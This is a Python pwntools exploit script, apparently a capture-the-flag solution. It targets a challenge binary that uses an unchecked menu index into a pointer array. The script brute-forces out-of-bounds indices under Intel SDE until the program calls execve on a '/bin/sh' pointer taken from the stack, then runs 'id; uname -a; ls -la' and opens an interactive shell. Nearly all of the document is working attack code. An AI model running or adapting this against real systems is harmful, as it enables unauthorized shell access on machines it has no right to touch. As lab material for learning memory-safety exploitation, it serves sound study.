#!/usr/bin/env python3
"""
solve_puzzle.py

The target program:

    - Prints a simple menu (ls / pwd / find)
    - Reads an integer `choice` with scanf("%d", &choice)
    - Uses that integer as an index into a small stack array of char*:
          char *execs[] = { "/bin/ls", "/bin/pwd", "/bin/find" };
      and then calls:
          printf("Executing %s\n", execs[choice-1]);
          execve(execs[choice-1], NULL, NULL);

There is no bounds check on `choice`, so by providing out-of-range values
we can make it print and exec arbitrary pointers from the stack instead
of only the three intended entries in `execs`.

This script brute‑forces a *range* of indices (negative and positive),
watching what string gets printed after "Executing ". When that string
is "/bin/sh" (coming from an argv pointer placed on the stack by SDE),
we've effectively tricked the program into execve("/bin/sh", NULL, NULL)
and thus get a shell.
"""

import sys
import os
import subprocess
import time
from pwn import *

# =============================================================================
# CONFIG
# =============================================================================

context.arch = "amd64"
# Keep pwntools quiet; we print our own progress messages
context.log_level = "critical"

ORIGINAL_BINARY = "./bin/puzzle"

# Intel SDE configuration
SDE_PATH = "./sdekit/sde64"
CET_LOG  = "cet_puzzle.log"
SDE_ARGS = [
    "-no-follow-child",
    "-cet",
    "-cet_output_file", CET_LOG,
    "--",
]


def solve():
    """
    Brute‑force the out‑of‑bounds index used in execs[choice-1].

    Strategy:

      1. Run puzzle under SDE with an extra argument "/bin/sh":
            ./sdekit/sde64 ... -- ./bin/puzzle /bin/sh

         That means somewhere on the stack there is a pointer to "/bin/sh"
         (argv[1]) that we might be able to reach via out‑of‑bounds indexing
         into the local execs[] array.

      2. For each candidate index N in [-10, 300]:
           - Start a fresh SDE + puzzle /bin/sh process
           - Wait for the menu
           - Send N as the choice
           - Read "Executing <string>" line
           - If the printed string contains "/bin/sh", we just made the
             program call execve("/bin/sh", NULL, NULL), and we get a shell.

      3. Once we see "/bin/sh" in the printed line, send standard shell
         commands and drop to interactive mode.
    """

    if not os.path.exists(ORIGINAL_BINARY):
        print(f"Error: {ORIGINAL_BINARY} not found.")
        sys.exit(1)

    print("[*] Starting Deep Stack Scanner (-10 to 300)...")
    print("[*] Looking for pointer to '/bin/sh'...")

    # Clean up any previous SDE instances.
    # This avoids leftover emulator processes interfering with our runs.
    subprocess.run(
        ["killall", "-9", "sde64"],
        stderr=subprocess.DEVNULL
    )

    # We scan a relatively large index range:
    #   - Negative indices: to walk *before* execs[] on the stack
    #   - Positive indices: to walk *beyond* execs[] on the stack
    for idx in range(-10, 300):
        try:
            # Build the SDE command:
            #
            #   ./sdekit/sde64 -no-follow-child -cet -cet_output_file cet_puzzle.log -- \
            #         ./bin/puzzle /bin/sh
            #
            # "/bin/sh" becomes argv[1] for the puzzle program and will live
            # somewhere in the process memory (often on the stack area near execs[]).
            proc_args = [SDE_PATH] + SDE_ARGS + [ORIGINAL_BINARY, "/bin/sh"]

            # Launch SDE + puzzle. We do this fresh for each index so that
            # memory layout remains deterministic per run and we don't
            # crash/poison subsequent attempts.
            p = process(proc_args)

            try:
                # 1. Wait for the menu to fully print.
                #    The menu ends with the "3. find" line, so we use that as a marker.
                p.recvuntil(b"3. find\n", timeout=1.0)

                # 2. Send the current index as our menu choice.
                #    This ends up in the `choice` variable used as execs[choice-1].
                p.sendline(str(idx).encode())

                # 3. The program prints:
                #       Executing %s\n
                #    We skip up to "Executing " then read the rest of the line.
                p.recvuntil(b"Executing ", timeout=0.5)
                leak_bytes = p.recvline(keepends=False, timeout=0.5)

                # Convert the leaked bytes to a string, ignoring bad encodings.
                leak = leak_bytes.decode(errors='ignore').strip()

                if leak:
                    print(f"[{idx:03d}] FOUND: {leak}")

                    # If the string includes "/bin/sh" we have our jackpot.
                    # That means execs[choice-1] was a pointer to "/bin/sh".
                    if "/bin/sh" in leak:
                        print(f"\n[+] BOOM! Shell target found at index {idx}!")
                        print("[+] Triggering payload...")

                        # Once "Executing /bin/sh" is printed, execve("/bin/sh", ...) runs
                        # immediately afterwards. If it succeeds, *this* process now *is*
                        # /bin/sh under SDE, with no CET violations.
                        #
                        # We try a few commands to confirm we have a working shell.
                        p.sendline(b"echo PWNED; id; uname -a; ls -la")

                        # Attempt to receive some output from those commands.
                        try:
                            data = p.recv(timeout=1.0)
                            print(data.decode(errors='ignore'))
                        except Exception:
                            pass

                        # Drop into interactive mode so we can use the shell manually.
                        p.interactive()
                        return

                    # Optional sanity check:
                    # If we see the name of the program itself (e.g. "./bin/puzzle")
                    # it usually means we landed near argv[0]; argv[1] (/bin/sh)
                    # is then typically nearby on the stack.
                    if "puzzle" in leak:
                        print("      ^-- Found argv[0] (program name). "
                              "argv[1] (/bin/sh) should be nearby!")

            except (EOFError, PwnlibException):
                # EOF / crash / unexpected termination -> usually means the OOB
                # pointer we picked was invalid and caused a segfault somewhere
                # during the printf or execve. We just ignore and try next idx.
                pass

            # Make sure we cleanly close this SDE instance before next loop iteration.
            p.close()

        except KeyboardInterrupt:
            print("\nAborted by user.")
            sys.exit(0)
        except Exception:
            # Any other sporadic error (e.g., timing issues) – ignore and continue scanning.
            pass

    print("\n[-] Scan complete. Target not found in the specified range.")


if __name__ == "__main__":
    solve()

